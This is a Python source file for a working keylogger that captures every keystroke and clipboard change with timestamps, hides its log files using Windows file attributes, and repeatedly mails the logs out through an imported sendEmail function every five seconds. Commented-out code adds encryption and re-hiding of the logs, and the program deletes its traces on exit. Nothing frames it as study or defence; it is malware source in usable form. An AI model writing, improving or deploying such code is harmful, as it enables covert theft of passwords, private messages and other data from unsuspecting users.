import os
import threading
import time
from datetime import datetime 
from pynput import keyboard
import pyperclip
from threading import Thread
import ctypes
from emailFunctionality import sendEmail
from encryption import encryptContents 

log_file = "logs.txt"
clipBoard_file = "clipBoardLogs.txt"
with open(log_file, "w") and open(clipBoard_file, "w"):
    pass

import os

os.system(f'attrib +h "{log_file}"')
os.system(f'attrib +h "{clipBoard_file}"')



ThreadRunning = True
def on_press(key):
    global ThreadRunning
    if key == keyboard.Key.esc:
        print("escape")
        ThreadRunning = False
        return False  
    
    keyPressed = returnKeyType(key)
    with open(log_file, "a") as keyLogs:
        keyLogs.write(parseOutput(keyPressed))

def returnKeyType(key):
    try:
        keyPressed = key.char
    except AttributeError:
        keyPressed = key.name

    return keyPressed

def parseOutput(keyPressed):
    currTime = datetime.now()
    currTimeString = currTime.strftime("%H:%M:%S %d-%m-%Y")
    keyPressed = keyPressed + "     " + currTimeString + "\n"
    return keyPressed

def checkClipBoard():
    prevContent = None

    while ThreadRunning:
        currContent = pyperclip.paste()
        if currContent != prevContent:
            prevContent = currContent
            with open(clipBoard_file, "a") as clipBoardKeyLogs:
                clipBoardKeyLogs.write(parseOutput(prevContent))

        time.sleep(1)
    

def sendToEmail():

    while ThreadRunning:
        
        # if os.path.exists("logs.txt"):
        #     ctypes.windll.kernel32.SetFileAttributesW("logs.txt", 0x02)
        # if os.path.exists("clipBoardLogs.txt"):
        #     ctypes.windll.kernel32.SetFileAttributesW("clipBoardLogs.txt", 0x02)
        # if os.path.exists("logs.txt"):
        #     ctypes.windll.kernel32.SetFileAttributesW("logs.txt", 0x80)  # Remove hidden attribute
        # if os.path.exists("clipBoardLogs.txt"):
        #     ctypes.windll.kernel32.SetFileAttributesW("clipBoardLogs.txt", 0x80)  # Remove hidden attribute

        # # Encrypt contents
        # log_file = encryptContents("logs.txt")
        # clipBoard_file = encryptContents("clipBoardLogs.txt")

        # # Re-hide the files after encryption
        # if log_file and os.path.exists(log_file):
        #     ctypes.windll.kernel32.SetFileAttributesW(log_file, 0x02)
        # if clipBoard_file and os.path.exists(clipBoard_file):
        #     ctypes.windll.kernel32.SetFileAttributesW(clipBoard_file, 0x02)
        sendEmail()
        time.sleep(5)
    return


if __name__ == "__main__":
    try: 
        listener = keyboard.Listener(on_press=on_press)
        checkClipBoardThread = threading.Thread(target=checkClipBoard)
        checkClipBoardThread.daemon = True
        checkClipBoardThread.start()

        sendEmailThread = threading.Thread(target=sendToEmail)
        sendEmailThread.daemon = True
        sendEmailThread.start()

        listener.start() 
        listener.join()
        if os.path.exists("logs.txt"):
            os.remove("logs.txt")
        if os.path.exists("clipBoardLogs.txt"):
            os.remove("clipBoardLogs.txt")
        if os.path.exists("logs.bin"):
            os.remove("logs.bin")
        if os.path.exists("clipBoardLogs.bin"):
            os.remove("clipBoardLogs.bin")
  
    except KeyboardInterrupt:
        ThreadRunning = False
        


